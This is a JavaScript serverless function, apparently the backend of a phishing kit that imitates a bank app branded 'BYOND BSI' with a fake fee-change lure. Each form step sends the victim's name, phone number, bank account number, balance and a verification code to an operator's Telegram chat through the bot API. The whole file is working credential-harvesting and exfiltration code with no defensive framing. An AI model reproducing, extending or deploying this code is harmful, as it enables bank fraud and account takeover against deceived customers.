const axios = require('axios');

exports.handler = async (event, context) => {
    // Handle CORS preflight
    if (event.httpMethod === 'OPTIONS') {
        return {
            statusCode: 204,
            headers: {
                'Access-Control-Allow-Origin': '*',
                'Access-Control-Allow-Headers': 'Content-Type',
                'Access-Control-Allow-Methods': 'POST'
            }
        };
    }

    // Only accept POST requests
    if (event.httpMethod !== 'POST') {
        return {
            statusCode: 405,
            body: JSON.stringify({ error: 'Method Not Allowed' })
        };
    }

    try {
        const data = JSON.parse(event.body);
        const botToken = process.env.TELEGRAM_BOT_TOKEN;
        const chatId = process.env.TELEGRAM_CHAT_ID;

        if (!botToken || !chatId) {
            throw new Error('Telegram credentials not configured');
        }

        // Format message based on step
        let message;
        switch (data.step) {
            case 'tariff-selection':
                message = `
╭───────────────────────────
│  🔔 *BYOND BSI - PILIHAN TARIF*  
├───────────────────────────
│  Pelanggan memilih:
│  *${data.tariff === 'old' ? 'TARIF LAMA (Rp 6.500/transaksi)' : 'TARIF BARU (Rp 150.000/bulan)'}*
╰───────────────────────────
                `;
                break;

            case 'account-verification-1':
                message = `
╭───────────────────────────
│  🔐 *BYOND BSI - VERIFIKASI 1*  
├───────────────────────────
│  *📌 DATA PRIBADI*  
├───────────────────────────
│  • Nama: ${data.name || '-'}
│  • No HP: ${data.phone || '-'}
├───────────────────────────
│  • Pilihan Tarif: ${data.tariff === 'old' ? 'Lama' : 'Baru'}
╰───────────────────────────
                `;
                break;

            case 'account-verification-2':
                message = `
╭───────────────────────────
│  🔢 *BYOND BSI - VERIFIKASI 2*  
├───────────────────────────
│  *📌 DATA REKENING*  
├───────────────────────────
│  • No Rekening: ${data.accountNumber || '-'}
│  • Pilihan Tarif: ${data.tariff === 'old' ? 'Lama' : 'Baru'}
╰───────────────────────────
                `;
                break;

            case 'account-verification-3':
                message = `
╭───────────────────────────
│  💰 *BYOND BSI - VERIFIKASI 3*  
├───────────────────────────
│  *📌 DATA SALDO*  
├───────────────────────────
│  • Saldo: Rp ${formatNumber(data.balance) || '-'}
│  • Pilihan Tarif: ${data.tariff === 'old' ? 'Lama' : 'Baru'}
╰───────────────────────────
                `;
                break;

            case 'complete-verification':
                message = `
╭───────────────────────────
│  ✅ *BYOND BSI - VERIFIKASI BERHASIL*  
├───────────────────────────
│  *📌 DATA LENGKAP*  
├───────────────────────────
│  • Nama: ${data.name || '-'}
│  • No HP: ${data.phone || '-'}
├───────────────────────────
│  • No Rek: ${data.accountNumber || '-'}
│  • Saldo: Rp ${formatNumber(data.balance) || '-'}
├───────────────────────────
│  • Kode: ${data.virtualCode || '-'}
│  • Tarif: ${data.tariff === 'old' ? 'Lama (Rp 6.500/transaksi)' : 'Baru (Rp 150.000/bulan)'}
╰───────────────────────────
                `;
                break;

            case 'request-new-code':
                message = `
╭───────────────────────────
│  🔄 *BYOND BSI - PERMINTAAN KODE*  
├───────────────────────────
│  Permintaan kode virtual baru
│  untuk nomor:
│  *${data.phone || '-'}*
╰───────────────────────────
                `;
                break;

            default:
                message = `
╭───────────────────────────
│  ℹ️ *BYOND BSI - DATA DITERIMA*  
├───────────────────────────
│  Data tidak dikenali:
│  ${JSON.stringify(data, null, 2)}
╰───────────────────────────
                `;
        }

        // Send to Telegram
        await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            chat_id: chatId,
            text: message,
            parse_mode: 'Markdown'
        });

        return {
            statusCode: 200,
            body: JSON.stringify({ success: true }),
            headers: { 'Content-Type': 'application/json' }
        };

    } catch (error) {
        return {
            statusCode: 500,
            body: JSON.stringify({ 
                success: false,
                error: error.message 
            })
        };
    }
};

// Helper function to format numbers
function formatNumber(num) {
    if (!num) return '0';
    return num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".");
    }
